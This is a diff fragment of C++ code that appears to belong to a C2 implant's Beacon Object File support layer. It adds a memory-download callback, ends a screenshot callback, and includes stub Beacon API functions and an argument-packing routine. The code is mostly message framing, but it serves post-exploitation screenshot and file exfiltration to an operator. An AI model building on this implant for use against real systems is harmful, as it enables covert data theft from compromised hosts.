+    BofAddMessageRaw(gCurrentContext, CALLBACK_AX_SCREENSHOT, blob.data(), (int)blob.size());
+}
+
+void AxDownloadMemory(char* filename, char* data, int len)
+{
+    if (!gCurrentContext || !data || len < 0) {
+        return;
+    }
+    int nameLen = filename ? (int)strlen(filename) : 0;
+    DWORD beName = htonl(nameLen);
+    DWORD beLen = htonl(len);
+    std::vector<BYTE> blob;
+    blob.insert(blob.end(), (BYTE*)&beName, (BYTE*)&beName + sizeof(beName));
+    if (nameLen > 0) {
+        blob.insert(blob.end(), (BYTE*)filename, (BYTE*)filename + nameLen);
+    }
+    blob.insert(blob.end(), (BYTE*)&beLen, (BYTE*)&beLen + sizeof(beLen));
+    if (len > 0) {
+        blob.insert(blob.end(), (BYTE*)data, (BYTE*)data + len);
+    }
+    BofAddMessageRaw(gCurrentContext, CALLBACK_AX_DOWNLOAD_MEM, blob.data(), (int)blob.size());
+}
+
+void BeaconRegisterThreadCallback(PVOID, PVOID) {}
+void BeaconUnregisterThreadCallback() {}
+void BeaconWakeup() {}
+HANDLE BeaconGetStopJobEvent()
+{
+    if (!gStopJobEvent) {
+        gStopJobEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
+    }
+    return gStopJobEvent;
+}
+
+static void AppendPacked(std::vector<BYTE>& out, const void* data, size_t size)
+{
+    if (!data || size == 0) {
+        return;
+    }
+    const BYTE* bytes = (const BYTE*)data;
+    out.insert(out.end(), bytes, bytes + size);
+}
+
+BYTE* PackArgs(const char* format, int* outLen, ...)
+{
+    if (outLen) {
+        *outLen = 0;
+    }
+    if (!format) {
+        return NULL;
+    }
+
+    std::vector<BYTE> packed;
+    va_list args;
+    va_start(args, outLen);
+
+    for (const char* c = format; *c; ++c) {
+        switch (*c) {
+        case 'i': {
+            int value = va_arg(args, int);
+            DWORD be = htonl((u_long)value);
+            AppendPacked(packed, &be, sizeof(be));
+            break;
+        }
+        case 's': {
+            int value = va_arg(args, int);
+            WORD be = htons((u_short)value);
+            AppendPacked(packed, &be, sizeof(be));
+            break;
+        }
+        case 'z': {
+            const char* value = va_arg(args, const char*);
+            int len = value ? (int)strlen(value) + 1 : 1;
+            DWORD be = htonl((u_long)len);
+            AppendPacked(packed, &be, sizeof(be));
+            if (value) {
+                AppendPacked(packed, value, (size_t)len);
+            } else {
+                BYTE nul = 0;
+                AppendPacked(packed, &nul, 1);
+            }
+            break;
+        }
+        case 'Z': {
+            const wchar_t* value = va_arg(args, const wchar_t*);
+            int byteLen = value ? ((int)wcslen(value) + 1) * (int)sizeof(wchar_t) : (int)sizeof(wchar_t);
+            DWORD be = htonl((u_long)byteLen);
+            AppendPacked(packed, &be, sizeof(be));
+            if (value) {
+                AppendPacked(packed, value, (size_t)byteLen);
+            } else {
+                wchar_t zero = 0;
+                AppendPacked(packed, &zero, sizeof(zero));
+            }
+            break;
+        }
+        case 'b': {
+            const BYTE* value = va_arg(args, const BYTE*);
+            int len = va_arg(args, int);
+            if (len < 0) {
+                len = 0;
+            }
+            DWORD be = htonl((u_long)len);
+            AppendPacked(packed, &be, sizeof(be));
+            if (value && len > 0) {
+                AppendPacked(packed, value, (size_t)len);
+            }
+            break;
+        }
+        default:
+            break;
+        }
+    }
+
+    va_end(args);
+
+    if (packed.empty()) {
+        return NULL;
+    }
+
+    BYTE* result = (BYTE*)malloc(packed.size());
+    if (!result) {
+        return NULL;
+    }
+    memcpy(result, packed.data(), packed.size());
+    if (outLen) {
+        *outLen = (int)packed.size();
+    }
+    return result;
+}
